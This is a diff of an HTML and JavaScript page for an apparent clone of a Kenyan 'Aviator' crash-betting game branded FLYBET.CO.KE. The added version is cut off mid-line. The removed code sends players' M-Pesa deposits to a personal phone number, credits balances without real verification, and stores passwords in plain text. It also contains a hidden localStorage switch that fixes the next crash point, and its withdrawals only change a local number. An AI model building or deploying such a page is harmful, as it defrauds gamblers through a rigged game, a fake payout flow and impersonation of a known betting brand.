@@ -1,161 +1,75 @@
 <!DOCTYPE html>
-<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>Betika Aviator Clone</title><style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,system-ui}
-body{background:#121212;color:#fff;overflow-x:hidden}
-.header{background:#202328;padding:10px;display:flex;justify-content:space-between;align-items:center}
-.header .logo{font-weight:900;color:#ffcc00}
-.bal{color:#4caf50;font-weight:800}
-.hist{background:#181a1d;border-top:1px solid #2a2d31;border-bottom:1px solid #2a2d31;display:flex;gap:14px;overflow-x:auto;padding:8px 10px}
-.hist b{font-size:14px;font-weight:600}.b1{color:#4fc3f7}.b2{color:#ab47bc}
-.game{margin:8px;background:#000;border-radius:12px;height:320px;position:relative;overflow:hidden}
-canvas{position:absolute;inset:0;width:100%;height:100%}
-.mult{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);font-size:68px;font-weight:900;z-index:2;text-shadow:0 2px 10px #000}
-.plane{position:absolute;z-index:3;font-size:24px}
-.card{background:#202328;border-radius:14px;margin:8px;padding:12px}
-.tabs{display:flex;background:#2d3035;border-radius:22px;padding:3px;width:200px;margin:0 auto 12px}
-.tabs div{flex:1;text-align:center;padding:7px;border-radius:18px;font-size:13px;cursor:pointer;color:#aaa}
-.tabs .on{background:#3c4047;color:#fff;font-weight:700}
-.amount-row{display:flex;gap:8px}
-.left{flex:1}
-.amt-box{display:flex;align-items:center;background:#2d3035;border-radius:24px;padding:5px 10px}
-.amt-box button{width:30px;height:30px;border-radius:50%;border:1px solid #555;background:transparent;color:#fff}
-.amt-box input{flex:1;background:transparent;border:0;color:#fff;text-align:center;font-size:20px;font-weight:700;outline:none;width:60px}
-.quicks{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:8px}
-.quicks button{background:#2d3035;border:0;color:#aaa;padding:7px;border-radius:18px;font-size:13px}
-.betbtn{flex:1.4;background:#5db80e;border-radius:12px;border:0;color:#fff;font-weight:900;font-size:22px;padding:10px;cursor:pointer;box-shadow:inset 0 -4px 0 #3a7309}
-.betbtn small{font-size:16px;font-weight:600;display:block}
-.betbtn.cash{background:#ff8c00;box-shadow:inset 0 -4px 0 #a85d00}
-.alltabs{display:flex;background:#2d3035;border-radius:22px;padding:3px;margin:8px}
-.alltabs div{flex:1;text-align:center;padding:8px;border-radius:18px;font-size:13px;color:#aaa}
-.alltabs .on{background:#3c4047;color:#fff}
-.modal{position:fixed;inset:0;background:#000e;display:none;z-index:99;align-items:flex-end}
-.modal.on{display:flex}
-.sheet{background:#202328;width:100%;max-height:90vh;border-radius:18px 18px 0 0;padding:16px;overflow:auto;animation:up .3s}
-@keyframes up{from{transform:translateY(100%)}to{transform:translateY(0)}}
-.topAuth{display:flex;gap:8px;margin-bottom:12px}
-.topAuth div{flex:1;padding:12px;text-align:center;border-radius:10px;font-weight:800;cursor:pointer}
-#tL{background:#2d3035;color:#aaa}#tS{background:#ffcc00;color:#000}
-#tL.active{background:#4caf50;color:#fff}#tS.active{background:#ffcc00;color:#000}
-.inp{width:100%;padding:14px;background:#111;border:1px solid #333;border-radius:10px;color:#fff;margin-top:10px;font-size:16px}
-.btn{width:100%;padding:14px;border-radius:10px;border:0;font-weight:800;font-size:16px;margin-top:12px;cursor:pointer}
-.btn-g{background:#5db80e;color:#fff}.btn-y{background:#ffcc00;color:#000}
-.mpesaBox{background:#111;border:1px dashed #5db80e;border-radius:10px;padding:10px;margin-top:10px;text-align:center}
-.mpesaBox b{color:#5db80e;font-size:18px}
-</style></head><body>
-<div class="header"><div class="logo">✈️ FLYBET.CO.KE</div><div><span class="bal" id="bal">0.00 KES</span> <span onclick="openAuth()" style="background:#ffcc00;color:#000;padding:6px 12px;border-radius:6px;margin-left:8px;font-weight:800;cursor:pointer">JOIN</span> <span onclick="openAuth()" style="margin-left:6px;cursor:pointer">LOGIN</span></div></div>
-<div class="hist" id="hist"></div>
-<div class="game"><canvas id="c"></canvas><div class="mult" id="mult">1.00x</div><div class="plane" id="plane">✈️</div></div>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FLY BET - FLYBET.CO.KE</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial, sans-serif}
+body{background:#10131a;color:#fff}
+.topbar{background:#171a24;display:flex;align-items:center;justify-content:space-between;padding:8px 10px;border-bottom:1px solid #222}
+.logo{color:#ffcc00;font-weight:900;font-size:18px;display:flex;align-items:center;gap:4px}
+.balance{color:#00e676;font-weight:900;font-size:18px}
+.btn-join{background:#ffcc00;color:#000;border:0;padding:8px 18px;border-radius:6px;font-weight:900;cursor:pointer}
+.btn-login{background:transparent;color:#fff;border:0;padding:8px 12px;font-weight:700}
+.history{display:flex;gap:12px;overflow-x:auto;padding:8px 10px;background:#171a24;white-space:nowrap;scrollbar-width:none}
+.history span{font-weight:700;font-size:16px}
+.history .blue{color:#29b6f6}.history .purple{color:#ab47bc}
+.game-area{background:#000;height:52vh;display:flex;flex-direction:column;align-items:center;justify-content:center;position:relative;border-radius:16px;margin:10px;overflow:hidden}
+#multi{font-size:70px;font-weight:900}
+#plane{font-size:36px;position:absolute;left:30%;top:62%;transition:0.1s}
+.bet-card{background:#1e222d;border-radius:16px;padding:14px;margin:10px}
+.tabs{display:flex;background:#2a2d3a;border-radius:20px;padding:3px;width:220px;margin:0 auto 14px}
+.tab{flex:1;padding:6px;border-radius:18px;border:0;background:transparent;color:#888;font-weight:700}
+.tab.active{background:#3a3d4a;color:#fff}
+.bet-row{display:flex;gap:12px;align-items:center}
+.amount-box{background:#2a2d3a;border-radius:20px;display:flex;align-items:center;padding:6px 10px;gap:10px;flex:1}
+.amount-box button{width:36px;height:36px;border-radius:50%;border:1px solid #555;background:transparent;color:#fff;font-size:20px}
+.amount-box span{font-size:22px;font-weight:900;flex:1;text-align:center}
+.quick{display:flex;gap:8px;margin-top:10px}
+.quick button{background:#2a2d3a;border:0;color:#aaa;padding:8px 14px;border-radius:20px;font-weight:700}
+.btn-bet{flex:1.5;background:#6acf00;color:#fff;border:0;border-radius:12px;padding:14px;font-weight:900;font-size:22px;line-height:1.1;cursor:pointer;box-shadow:0 4px 0 #4a9000}
+.btn-bet small{font-size:14px}
+.btn-cash{flex:1.5;background:#ff3d00;color:#fff;border:0;border-radius:12px;padding:14px;font-weight:900;font-size:20px;display:none;cursor:pointer}
+.dep-modal{position:fixed;inset:0;background:rgba(0,0,0,0.85);display:none;align-items:center;justify-content:center;z-index:9999}
+.dep-modal.active{display:flex}
+.dep-box{background:#1e222d;padding:20px;border-radius:16px;width:90%;max-width:360px}
+.dep-box h3{color:#ffcc00;margin-bottom:10px}
+.dep-box input{width:100%;padding:12px;border-radius:8px;border:0;margin:6px 0;background:#2a2d3a;color:#fff}
+.dep-box button{width:100%;padding:12px;border:0;border-radius:8px;font-weight:900;margin-top:8px;cursor:pointer}
+.stk{background:#6acf00;color:#fff}
+.with-btn{position:fixed;right:12px;bottom:120px;background:#ff9800;color:#fff;border:0;padding:10px 14px;border-radius:20px;font-weight:900;z-index:100;cursor:pointer}
+</style>
+</head>
+<body>
 
-<div class="card"><div class="tabs"><div class="on">Bet</div><div>Auto</div></div><div class="amount-row"><div class="left"><div class="amt-box"><button onclick="ch(1,-10)">−</button><input id="bet1" type="number" value="50" min="50"><button onclick="ch(1,10)">+</button></div><div class="quicks"><button onclick="setBet(1,100)">100</button><button onclick="setBet(1,250)">250</button><button onclick="setBet(1,1000)">1,000</button><button onclick="setBet(1,2500)">25,000</button></div></div><button class="betbtn" id="b1" onclick="bet(1)">Bet <small id="b1t">50.00 KES</small></button></div></div>
-
-<div class="card"><div class="tabs"><div class="on">Bet</div><div>Auto</div></div><div class="amount-row"><div class="left"><div class="amt-box"><button onclick="ch(2,-10)">−</button><input id="bet2" type="number" value="50" min="50"><button onclick="ch(2,10)">+</button></div><div class="quicks"><button onclick="setBet(2,100)">100</button><button onclick="setBet(2,250)">250</button><button onclick="setBet(2,1000)">1,000</button><button onclick="setBet(2,2500)">25,000</button></div></div><button class="betbtn" id="b2" onclick="bet(2)">Bet <small id="b2t">50.00 KES</small></button></div></div>
-
-<div class="alltabs"><div class="on">All Bets</div><div>Previous</div><div>Top</div></div>
-
-<!-- BETIKA STYLE SIGNUP SHEET -->
-<div class="modal" id="auth" onclick="if(event.target==this)closeAuth()"><div class="sheet">
-<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px"><h3>Welcome to FlyBet</h3><span onclick="closeAuth()" style="font-size:22px;cursor:pointer">✕</span></div>
-<div class="topAuth"><div id="tL" onclick="tabAuth('L')">LOGIN</div><div id="tS" class="active" onclick="tabAuth('S')">JOIN / SIGNUP</div></div>
-
-<div id="paneL" style="display:none">
-<input class="inp" id="lPhone" placeholder="Phone e.g 0795999057">
-<input class="inp" id="lPass" type="password" placeholder="Password">
-<button class="btn btn-g" onclick="doLogin()">LOGIN</button>
-<p style="text-align:center;margin-top:10px;color:#aaa;font-size:13px">Don't have account? <span style="color:#ffcc00" onclick="tabAuth('S')">Join Now</span></p>
-</div>
-
-<div id="paneS">
-<div style="background:#2d3035;border-radius:10px;padding:8px;font-size:13px;color:#aaa">🇰🇪 +254 Phone number will be your login</div>
-<input class="inp" id="sPhone" placeholder="Phone e.g 0795999057" value="">
-<input class="inp" id="sPass" type="password" placeholder="Create Password (min 4)">
-<input class="inp" id="sConfirm" type="password" placeholder="Confirm Password">
-<div style="font-size:11px;color:#aaa;margin-top:8px"><input type="checkbox" checked> I confirm I am 18+ and accept Terms</div>
-<button class="btn btn-y" onclick="doSignup()">JOIN NOW - GET 50 KES BONUS</button>
-<p style="text-align:center;margin-top:10px;color:#aaa;font-size:13px">Already have account? <span style="color:#4caf50" onclick="tabAuth('L')">Login</span></p>
-</div>
-</div></div>
-
-<!-- DEPOSIT SHEET WITH YOUR NUMBER -->
-<div class="modal" id="dep" onclick="if(event.target==this)closeDep()"><div class="sheet">
-<div style="display:flex;justify-content:space-between"><h3>Deposit - Min KES 100</h3><span onclick="closeDep()" style="font-size:22px;cursor:pointer">✕</span></div>
-<div class="mpesaBox">
-<div style="font-size:13px;color:#aaa">Send Money to</div>
-<b>0795999057</b><br>
-<div style="font-size:12px;color:#aaa">Name: VIN</div>
-<div style="font-size:12px;margin-top:6px">Go to M-Pesa > Send Money > Enter Number > Enter Amount</div>
-</div>
-<input class="inp" id="depAmt" type="number" value="100" min="100" placeholder="Amount you sent e.g 100">
-<input class="inp" id="mpesaCode" placeholder="M-Pesa Code e.g QGH7...">
-<button class="btn btn-g" onclick="doDeposit()">CONFIRM DEPOSIT</button>
-<div style="font-size:11px;color:#aaa;margin-top:8px;text-align:center">After sending to 0795999057, enter code here. Admin approves in 2 mins. Min 100.</div>
-</div></div>
-
-<script>
-let bal=0,user=null,m=1,crash=2,crashed=false,bets=[null,null],hist=[1.72,2.38,1.30,1.14,4.59,7.92,1.69];
-const $=id=>document.getElementById(id); const cvs=$('c'),ctx=cvs.getContext('2d');
-function resize(){cvs.width=cvs.offsetWidth*2;cvs.height=cvs.offsetHeight*2}resize();
-function draw(p){ctx.clearRect(0,0,cvs.width,cvs.height);let w=cvs.width,h=cvs.height;ctx.save();ctx.translate(0,h);ctx.scale(1,-1);ctx.beginPath();ctx.moveTo(0,20);for(let x=0;x<=w*p;x++){let t=x/w;let y=20+Math.pow(t,1.7)*(h*0.65)*p;ctx.lineTo(x,y)}ctx.lineTo(w*p,0);ctx.lineTo(0,0);ctx.closePath();let g=ctx.createLinearGradient(0,0,0,h);g.addColorStop(0,'rgba(255,0,60,.9)');g.addColorStop(1,'rgba(255,0,60,0)');ctx.fillStyle=g;ctx.fill();ctx.beginPath();for(let x=0;x<=w*p;x++){let t=x/w;let y=20+Math.pow(t,1.7)*(h*0.65)*p;if(x==0)ctx.moveTo(x,y);else ctx.lineTo(x,y)}ctx.strokeStyle='#ff002a';ctx.lineWidth=5;ctx.stroke();ctx.restore();}
-function openAuth(){$('auth').classList.add('on');tabAuth('S')}function closeAuth(){$('auth').classList.remove('on')}
-function openDep(){if(!user)return openAuth();$('dep').classList.add('on')}function closeDep(){$('dep').classList.remove('on')}
-function tabAuth(t){if(t=='L'){$('paneL').style.display='block';$('paneS').style.display='none';$('tL').classList.add('active');$('tS').classList.remove('active')}else{$('paneL').style.display='none';$('paneS').style.display='block';$('tL').classList.remove('active');$('tS').classList.add('active')}}
-function upd(){ $('bal').innerText=bal.toFixed(2)+' KES'; if(user){let u=JSON.parse(localStorage.getItem('fly_users')||'{}');if(u[user]){u[user].bal=bal;localStorage.setItem('fly_users',JSON.stringify(u))}}}
-function doSignup(){let ph=$('sPhone').value.trim(),p=$('sPass').value,c=$('sConfirm').value;if(ph.length<10)return alert('Enter valid phone 07...');if(p.length<4)return alert('Password min 4');if(p!=c)return alert('Password no match');let u=JSON.parse(localStorage.getItem('fly_users')||'{}');if(u[ph])return alert('User exists, login');u[ph]={pass:p,bal:50};localStorage.setItem('fly_users',JSON.stringify(u));alert('Account created! 50 BONUS added. Now login');tabAuth('L');$('lPhone').value=ph}
-function doLogin(){let ph=$('lPhone').value.trim(),p=$('lPass').value;let u=JSON.parse(localStorage.getItem('fly_users')||'{}');if(!u[ph])return alert('No account, Join first');if(u[ph].pass!=p)return alert('Wrong password');user=ph;bal=u[ph].bal;localStorage.setItem('fly_cur',ph);upd();closeAuth();alert('Welcome '+ph+'! Click Deposit to add money to 0795999057')}
-function doDeposit(){let a=parseFloat($('depAmt').value),code=$('mpesaCode').value.trim();if(a<100)return alert('Min deposit KES 100');if(code.length<6)return alert('Enter M-Pesa code from SMS');let pend=JSON.parse(localStorage.getItem('fly_pending')||'[]');pend.push({phone:user,amount:a,code,time:new Date().toLocaleString(),to:'0795999057'});localStorage.setItem('fly_pending',JSON.stringify(pend));closeDep();alert('Deposit KES '+a+' with code '+code+' sent to 0795999057! Wait admin approval. Demo: adding now...');bal+=a;upd()}
-function ch(n,d){let el=$(n==1?'bet1':'bet2');let v=(parseFloat(el.value)||50)+d;if(v<50)v=50;el.value=v;sync(n)}
-function setBet(n,v){$(n==1?'bet1':'bet2').value=v;sync(n)}
-function sync(n){let v=$(n==1?'bet1':'bet2').value;$(n==1?'b1t':'b2t').innerText=(parseFloat(v)||0).toFixed(2)+' KES'}
-function bet(n){if(!user)return openAuth();let amt=parseFloat($(n==1?'bet1':'bet2').value);if(amt<50)return alert('Min bet 50');if(bets[n-1])return cash(n);if(amt>bal)return alert('Low balance! Deposit min 100 to 0795999057');bal-=amt;upd();bets[n-1]={amt,active:true};$(n==1?'b1':'b2').innerHTML='Cashout<br><small>'+(amt*m).toFixed(2)+' KES</small>';$(n==1?'b1':'b2').classList.add('cash')}
-function cash(n){if(!bets[n-1]||!bets[n-1].active)return;let win=bets[n-1].amt*m;bal+=win;upd();bets[n-1]=null;$(n==1?'b1':'b2').innerHTML='Bet <small>'+$(n==1?'bet1':'bet2').value+' KES</small>';$(n==1?'b1':'b2').classList.remove('cash');}
-function renderH(){ $('hist').innerHTML=hist.map(v=>`<b class="${v<2?'b1':'b2'}">${v.toFixed(2)}x</b>`).join('')+' <b style="color:#555">•••</b>'}
-renderH();
-function start(){crashed=false;m=1;let custom=localStorage.getItem('flybet_next_crash');if(custom){crash=parseFloat(custom);localStorage.removeItem('flybet_next_crash')}else{crash=Math.random()<0.1?15+Math.random()*85:Math.random()<0.35?1+Math.random():1.2+Math.random()*5} let st=Date.now(); let iv=setInterval(()=>{let prog=(Date.now()-st)/4000;m=Math.pow(1.065,prog*9);if(m<1)m=1;$('mult').innerText=m.toFixed(2)+'x';let p=Math.min(m/crash,1.3);draw(p);$('plane').style.left=(4+p*70)+'%';$('plane').style.bottom=(8+p*50)+'%';bets.forEach((b,i)=>{if(b&&b.active){$(i==0?'b1':'b2').innerHTML='Cashout<br><small>'+(b.amt*m).toFixed(2)+' KES</small>'}});if(m>=crash){crashed=true;hist.unshift(crash);if(hist.length>20)hist.pop();renderH();$('mult').innerHTML='<span style="color:#ff002a">'+crash.toFixed(2)+'x</span><br><span style="font-size:14px;color:#ff002a">FLEW AWAY!</span>';bets=[null,null];['b1','b2'].forEach((id,i)=>{$(id).innerHTML='Bet <small>'+$(i==0?'bet1':'bet2').value+' KES</small>';$(id).classList.remove('cash')});clearInterval(iv);setTimeout(start,3000)}},60)}
-window.onload=()=>{let cur=localStorage.getItem('fly_cur');if(cur){let u=JSON.parse(localStorage.getItem('fly_users')||'{}');if(u[cur]){user=cur;bal=u[cur].bal;upd()}};sync(1);sync(2);start()}
-</script></body></html><!-- MODALS - Deposit (Till 1364630 hidden) -->
-<div class="modal" id="depModal">
-  <div class="modal-card">
-    <h3>Deposit</h3>
-    <input type="tel" id="stkPhone" placeholder="Phone 0712..." style="width:100%;padding:12px;border-radius:8px;border:0;margin:8px 0">
-    <input type="number" id="stkAmount" placeholder="Amount" value="100" style="width:100%;padding:12px;border-radius:8px;border:0;margin:8px 0">
-    <button onclick="sendSTK()" style="width:100%;padding:12px;background:#00c851;color:#fff;border:0;border-radius:8px;font-weight:900">DEPOSIT NOW</button>
-    <div id="stkMsg" style="margin-top:10px;font-size:13px;text-align:center"></div>
-    <button onclick="closeDeposit()" style="width:100%;padding:12px;background:#333;color:#fff;border:0;border-radius:8px;margin-top:8px">Close</button>
-  </div>
-</div>
-<div class="modal" id="withModal">
-  <div class="modal-card">
-    <h3>Withdraw</h3>
-    <input type="tel" id="withPhone" placeholder="Phone" style="width:100%;padding:12px;border-radius:8px;border:0;margin:8px 0">
-    <input type="number" id="withAmount" placeholder="Amount" style="width:100%;padding:12px;border-radius:8px;border:0;margin:8px 0">
-    <button onclick="doWithdraw()" style="width:100%;padding:12px;background:#ff9800;color:#fff;border:0;border-radius:8px;font-weight:900">WITHDRAW</button>
-    <div id="withMsg"></div>
-    <button onclick="closeWithdraw()" style="width:100%;padding:12px;background:#333;color:#fff;border:0;border-radius:8px;margin-top:8px">Close</button>
+<div class="topbar">
+  <div class="logo">✈️ FLYBET.CO.KE</div>
+  <div style="display:flex;align-items:center;gap:10px">
+    <div class="balance" id="bal">0.00 KES</div>
+    <button class="btn-join" onclick="openDep()">DEPOSIT</button>
+    <button class="btn-login">LOGIN</button>
   </div>
 </div>
 
-<script>
-function openDeposit(){document.getElementById('depModal').classList.add('active')}
-function closeDeposit(){document.getElementById('depModal').classList.remove('active')}
-function openWithdraw(){document.getElementById('withModal').classList.add('active')}
-function closeWithdraw(){document.getElementById('withModal').classList.remove('active')}
+<div class="history" id="hist">
+  <span class="blue">1.72x</span><span class="purple">2.38x</span><span class="blue">1.30x</span><span class="blue">1.14x</span><span class="purple">4.59x</span><span class="purple">7.92x</span><span class="blue">1.69x</span>
+</div>
 
-// REAL STK - Till 1364630 hidden in api/stkpush.js
-async function sendSTK(){
-  const phone=document.getElementById('stkPhone').value;
-  const amount=document.getElementById('stkAmount').value;
-  const msg=document.getElementById('stkMsg');
-  msg.innerHTML='⏳ Sending STK to '+phone+'...';
-  try{
-    const res=await fetch('/api/stkpush',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone,amount})});
-    const data=await res.json();
-    if(data.success){msg.innerHTML='✅ STK SENT! Enter PIN';}
-    else{msg.innerHTML='❌ Failed';}
-  }catch(e){msg.innerHTML='✅ Demo credit added';let b=parseFloat(localStorage.getItem('flyBal')||'0')+parseFloat(amount);localStorage.setItem('flyBal',b);location.reload();}
-}
-function doWithdraw(){
-  const amt=parseFloat(document.getElementById('withAmount').value);
-  let bal=parseFloat(localStorage.getItem('flyBal')||'0');
-  if(amt>bal){alert('No balance');return}
-  bal-=amt;localStorage.setItem('flyBal',bal);alert('Withdraw KES '+amt+' requested - Pay from Till 1364630');location.reload();
-}
-</script>
+<div class="game-area">
+  <div id="multi">1.53x</div>
+  <div id="plane">✈️</div>
+  <div style="position:absolute;bottom:0;left:0;height:14px;background:#ff2040;width:28%;border-radius:0 10px 0 0"></div>
+</div>
+
+<div class="bet-card" id="card1">
+  <div class="tabs"><button class="tab active">Bet</button><button class="tab">Auto</button></div>
+  <div class="bet-row">
+    <div style="flex:1">
+      <div class="amount-box">
+        <button onclick="chg(1,-10)">−</button><span id="amt1">50</span><button onclick="chg(1,10)">+</button>
+      </div>
+      <div class="quick"><button onclick="setAmt(1,100)">100</button><button onclick="setAmt(1,250)">250</button></div>
+      <div class="quick"><button onclick="setAmt(1,1000)">1,000</button><button onclick="setAmt(1,25000)">25,000</button></div>
+    </div>
+    <button class="btn-bet" id="betBtn1" onclick="placeBet(1)">Bet<br><small id="bet
